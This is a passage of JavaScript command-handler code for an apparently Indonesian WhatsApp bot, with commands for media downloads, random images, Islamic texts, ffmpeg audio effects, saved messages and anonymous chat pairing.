if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/fbdl?url=${text}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.link_normal }, caption: `SD QUALTY` }, { quoted: freply })
limitAdd(sender, limit)
}
break           
case 'fbhd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/fbdl?url=${text}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.link_high }, caption: `HD QUALTY` }, { quoted: freply })
limitAdd(sender, limit)
}
break           
case 'goredl': {        
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isPremium) return sticPremium(from)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('seegore.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/goredl?url=${q}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result.link }, caption: `「 *GORE DOWNLOAD* 」\n\n❏ *Judul* : ${anu.result.judul}\n❏ *Views* : ${anu.result.views}\n❏ *Comment* : ${anu.result.comment}\n❏ *Url* : ${q}`}, { quoted: freply })
}
break
case 'pindl': case 'pinterestdl': {      
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/pindl2?url=${text}&apikey=${daniapi}`)
Dani.sendMessage(m.chat, { video: { url: anu.result }, caption: mess.success }, { quoted: freply })
limitAdd(sender, limit)
}
break           
case 'umma': case 'ummadl': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw mess.urll
let { umma } = require('./lib/scraper')
let anu = await umma(isUrl(text)[0])
if (anu.type == 'video') {
let buttons = [
{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: 'AUDIO'}, type: 1},
{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: 'VIDEO'}, type: 1}
]
let buttonMessage = {
image: { url: anu.author.profilePic },
caption: `❏ *U M M A D O W L O A D* ❏

❏ *Title* : ${anu.title}
❏ *Author* : ${anu.author.name}
❏ *Like* : ${anu.like}
❏ *Caption* : ${anu.caption}
❏ *Url* : ${anu.media[0]}

_Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas_`,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
} else if (anu.type == 'image') {
anu.media.map(async (url) => {
Dani.sendMessage(m.chat, { image: { url }, caption: `*[UMMA DOWNLOAD]*\n❏ *Title* : ${anu.title}\n❏ *Author* : ${anu.author.name}\n❏ *Like* : ${anu.like}\n❏ *Caption* : ${anu.caption}` }, { quoted: freply })
limitAdd(sender, limit)
})
}
}
break
case 'mediafire': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!args[0]) return m.reply(`Example : \n${prefix + command} <url>`)
if (!isUrl(args[0])) return m.reply("Hanya Url!")
sticWait(from)
try {
let fmedi = await mediafire(args[0])
teks = `「 *MEDIAFIRE DOWNLOAD* 」

❏ *Name* : ${fmedi[0].name}
❏ *MimeType* : application/${fmedi[0].mime}
❏ *Size* :  ${fmedi[0].size}
❏ *Download Url* : ${fmedi[0].link}

_Media Sedang Dikirim Silahkan Menunggu Beberapa Saat_`
Dani.sendText(m.chat, teks, freply)
Dani.sendMessage(m.chat, {document:{url:fmedi[0].link}, mimetype:fmedi[0].mime, fileName:fmedi[0].name}, {quoted:freply})
limitAdd(sender, limit)
} catch(err) {
m.reply(String(err))
}
}
break
case 'sfiledl': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('sfile.mobi')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/sfiledl?url=${q}&apikey=${daniapi}`)
teks = `「 *SFILE DOWNLOAD* 」

❏ *Title* : ${anu.result.judul}
❏ *Size* : ${anu.result.size}
❏ *Download Url* : ${anu.result.link}

_Media Sedang Dikirim Silahkan Menunggu Beberapa Saat_`
Dani.sendText(m.chat, teks, freply)
Dani.sendMessage(m.chat, { document:{ url: anu.result.link }, mimetype: anu.result.mime, fileName: anu.result.judul }, {quoted:freply})
limitAdd(sender, limit)
}
break
case 'googledrive': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('drive.google.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/googledrive?url=${q}&apikey=${daniapi}`)
teks = `「 *GOOGLE DRIVE DOWNLOAD* 」

❏ *File Name* : ${anu.result.fileName}
❏ *File Size* : ${anu.result.fileSize}
❏ *MimeType* : ${anu.result.mimetype}
❏ *Download Url* : ${anu.result.downloadUrl}

_Media Sedang Dikirim Silahkan Menunggu Beberapa Saat_`
Dani.sendText(m.chat, teks, freply)
Dani.sendMessage(m.chat, { document:{ url: anu.result.downloadUrl }, mimetype: anu.result.mimetype, fileName: anu.result.fileName }, {quoted:freply})
limitAdd(sender, limit)
}
break
case 'stickerpackdl': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('getstickerpack.com')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/stickerdl?url=${q}&apikey=VeanMyLove`)
for (let res of anu.result.result) {
let encmedia = await Dani.sendImageAsSticker(m.chat, res, freply, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
}
}
break
case 'stickerlinedl': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('store.line.me')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/linesticker?url=${q}&apikey=${daniapi}`)
for (let res of anu.result.sticker) {
let encmedia = await Dani.sendImageAsSticker(m.chat, res, freply, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
}
}
break
case 'stickerteledl': case 'stickertelegramdl': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!q) throw mess.urll                
if (!isUrl(q)) throw mess.urll
if (!text.includes('t.me')) throw mess.falseurl
sticWait(from)
let anu = await fetchJson(`${webdani}/api/download/telesticker?url=${q}&apikey=${daniapi}`)
for (let res of anu.result.url) {
let encmedia = await Dani.sendImageAsSticker(m.chat, res, freply, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
limitAdd(sender, limit)
}
}
break
case 'ringtone': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `Example : ${prefix + command} black rover`
sticWait(from)
let { ringtone } = require('./lib/scraper')
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
Dani.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'aesthetic': case 'bonekachucky': case 'wallpapercyberspace': case 'wallpaperhacker': case 'wallpapertechnology': case 'wallpaperislamic': case 'wallpaperprogramming': case 'wallpaperpubg': case 'wallpapermountain': case 'memesuki': case 'meme': case 'darkmeme': case 'darkjoke': case 'kpop': case 'pentol': case 'doraemon': case 'quotesyt': case 'quotesimage': case 'pokemon': case 'renungan': case 'satanic': case 'tatasurya': case 'yulibocil': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/randomimage/${command}?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'indonesia': case 'korea': case 'china': case 'vietnam': case 'thailand': case 'malaysia': case 'japan': case 'jiso': case 'jeni': case 'justina': case 'rose': case 'ryujin': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
image: { url: `${webdani}/api/cecan/${command}?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'jedagjedugmodernwarship': case 'jedagjedugpubg': case 'jedagjedugfreefire': case 'jedagjedugmobilelegend': case 'faktamenarik': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: '➡️ NEXT'}, type: 1}
]
let buttonMessage = {
video: { url: `${webdani}/api/randomvideo/${command}?apikey=${daniapi}` },
caption: mess.success,
footer: `Made With 🤍 Dani | Copyright 2022`,
buttons: buttons,
headerType: 4
}
Dani.sendMessage(m.chat, buttonMessage, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'asmaulhusna': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/asmaulhusna?apikey=${daniapi}`)
let teks = `「 *ASMAUL HUSNA* 」\n\n`
for (let i of res.result) {
teks += `❏ *Number* : ${i.number}\n`
teks += `❏ *Latin* : ${i.latin}\n`
teks += `❏ *Arab* : ${i.arab}\n`
teks += `❏ *Indonesia* : ${i.translate_id}\n`
teks += `❏ *Inggris* : ${i.translate_en}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'niatsholat': case 'niatshalat': {           
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/niatsholat?apikey=${daniapi}`)
let teks = `「 *NIAT SHOLAT* 」\n\n`
for (let i of res.result) {
teks += `❏ *ID* : ${i.id}\n`
teks += `❏ *Name* : ${i.name}\n`
teks += `❏ *Arab* : ${i.arabic}\n`
teks += `❏ *Latin* : ${i.latin}\n`
teks += `❏ *Terjemahan* : ${i.terjemahan}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'bacaansholat': case 'bacaanshalat': {      
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/bacaansholat?apikey=${daniapi}`)
let teks = `「 *BACAAN SHOLAT* 」\n\n`
for (let i of res.result) {
teks += `❏ *ID* : ${i.id}\n`
teks += `❏ *Name* : ${i.name}\n`
teks += `❏ *Arab* : ${i.arabic}\n`
teks += `❏ *Latin* : ${i.latin}\n`
teks += `❏ *Terjemahan* : ${i.terjemahan}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'ayatkursi': {                   
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/ayatkursi?apikey=${daniapi}`)
let { tafsir, latin, arabic, translation } = res.result
let capt = `「 *AYAT KURSI* 」

❏ *Tafsir* : ${tafsir}
❏ *Latin* : ${latin}
❏ *Arabic* : ${arabic}
❏ *Translation* : ${translation}`
textImg(capt)
limitAdd(sender, limit)
}
break
case 'wirid': {                   
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/wirid?apikey=${daniapi}`)
let teks = `「 *WIRID* 」\n\n`
for (let i of res.result) {
teks += `❏ *ID* : ${i.id}\n`
teks += `❏ *Time* : ${i.times}\n`
teks += `❏ *Arab* : ${i.arabic}\n`            
teks += `❏ *Tnc* : ${i.tnc}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'tahlil': {            
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/tahlil?apikey=${daniapi}`)
let teks = `「 *TAHLIL* 」\n\n`
for (let i of res.result) {
teks += `❏ *ID* : ${i.id}\n`
teks += `❏ *Title* : ${i.title}\n`
teks += `❏ *Arab* : ${i.arabic}\n`            
teks += `❏ *Translate* : ${i.translation}\n\n\n`
}
textImg(teks)
limitAdd(sender, limit)
}
break
case 'kisahnabi': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `_*🇬🇧 : Example: Muhammad*_\n_*🇮🇩 : Contoh : Muhammad*_\n_*🇯🇵 : 例：ムハンマド*_`
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/kisahnabi?nabi=${text}&apikey=${daniapi}`)
let { name, kelahiran, wafat_usia, singgah, kisah } = res.result
let capt = `「 *KISAH NABI* 」

❏ *Name* : ${name}
❏ *Kelahiran* : ${kelahiran}
❏ *Wafat* : ${wafat_usia}
❏ *Singgah* : ${singgah}
❏ *Kisah* : ${kisah}`
textImg(capt)
limitAdd(sender, limit)
}
break
case 'randomalquran': {               
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
sticWait(from)
let res = await fetchJson(`${webdani}/api/muslim/randomquran?apikey=${daniapi}`)
let { audio, keterangan, ayat, asma, arti, urut, type, rukuk, nomor, nama } = res.result
let capt = `「 *RANDOM AL-QURAN* 」

❏ *Arti* : ${arti}
❏ *Asma* : ${asma}
❏ *Ayat* : ${ayat}
❏ *Keterangan* : ${keterangan}
❏ *Nama* : ${nama}
❏ *Nomor* : ${nomor}
❏ *Rukuk* : ${rukuk}
❏ *Type* : ${type}
❏ *Urut* : ${urut}`
Dani.sendText(m.chat, capt, freply)
Dani.sendMessage(m.chat, { audio: { url: audio }, mimetype: 'audio/mpeg'}, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'ayataudio': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (!text) throw `_*🇬🇧 : Example: 1*_\n_*🇮🇩 : Contoh : 1*_\n_*🇯🇵 : 例：1*_`
sticWait(from)
Dani.sendMessage(m.chat, { audio: { url: `${webdani}/api/muslim/alquranaudio?ayat=${text}&apikey=${daniapi}` }, mimetype: 'audio/mpeg'}, { quoted: freply })
limitAdd(sender, limit)
}
break
case 'juzamma': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)
if (args[0] === 'pdf') {
sticWait(from)
Dani.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:freply})
} else if (args[0] === 'docx') {
sticWait(from)
Dani.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:freply})
} else if (args[0] === 'pptx') {
sticWait(from)
Dani.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:freply})
} else if (args[0] === 'xlsx') {
sticWait(from)
Dani.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:freply})
} else {
textImg(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
limitAdd(sender, limit)
}
}
break
case 'alquran': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
let res = await fetchJson(`${webdani}/api/muslim/alquran?surah=${args[0]}&ayat=${args[1]}&apikey=${daniapi}`)
let txt = `「 *AL-QURAN* 」

❏ *Arab* : ${res.result.text.arab}
❏ *English* : ${res.result.translation.en}
❏ *Indonesia* : ${res.result.translation.id}

( Q.S ${res.result.surah.name.transliteration.id} : ${res.result.number.inSurah} )`
m.reply(txt)
Dani.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : freply })
limitAdd(sender, limit)
}
break
case 'tafsirsurah': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
let res = await fetchJson(`${webdani}/api/muslim/alquran?surah=${args[0]}&ayat=${args[1]}&apikey=${daniapi}`)
let txt = `「 *TAFSIR SURAH* 」

❏ *Pendek* : ${res.result.tafsir.id.short}

❏ *Panjang* : ${res.result.tafsir.id.long}

( Q.S ${res.result.surah.name.transliteration.id} : ${res.result.number.inSurah} )`
textImg(txt)
limitAdd(sender, limit)
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isLimit(sender, isPremium, isCreator, limitCount, limit)) return m.reply (`Limit kamu sudah habis silahkan buy premium untuk melanjutkan fitur`)		
try {
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
sticWait(from)
let media = await Dani.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
Dani.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
m.reply(e)
limitAdd(sender, limit)
}
break
case 'setcmd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
if (!text) throw `Untuk Command Apa?`
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
m.reply(`Done!`)
}
break
case 'delcmd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) throw `Tidak ada hash`
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
delete global.db.data.sticker[hash]
m.reply(`Done!`)
}
break
case 'listcmd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let teks = `
*LIST HANS*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
Dani.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
case 'lockcmd': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!m.quoted) throw 'Reply Pesan!'
if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
global.db.data.sticker[hash].locked = !/^un/i.test(command)
m.reply('Done!')
}
break
case 'addmsg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
if (!text) throw `Example : ${prefix + command} nama file`
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
case 'getmsg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
Dani.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
case 'listmsg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = '❏ *L I S T M S G*\n\n'
for (let i of seplit) {
teks += `❏ *Name :* ${i.nama}\n❏ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n\n\n`
}
m.reply(teks)
}
break
case 'delmsg': case 'deletemsg': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
m.reply(`Berhasil menghapus '${text}' dari list pesan`)
}
break
case 'anonymous': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)  
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
Dani.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await Dani.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
}
break
case 'keluar': case 'leave': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)  
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
let room = Object.values(db.data.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
throw false
}
m.reply('Ok')
let other = room.other(m.sender)
if (other) await Dani.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete db.data.anonymous[room.id]
if (command === 'leave') break
}
case 'mulai': case 'start': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)  
if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if (Object.values(db.data.anonymous).find(room => room.check(m.sender))) {
let buttons = [
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
await Dani.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, `Made With 🤍 Dani | Copyright 2022`, m)
throw false
}
let room = Object.values(db.data.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
{ buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
]
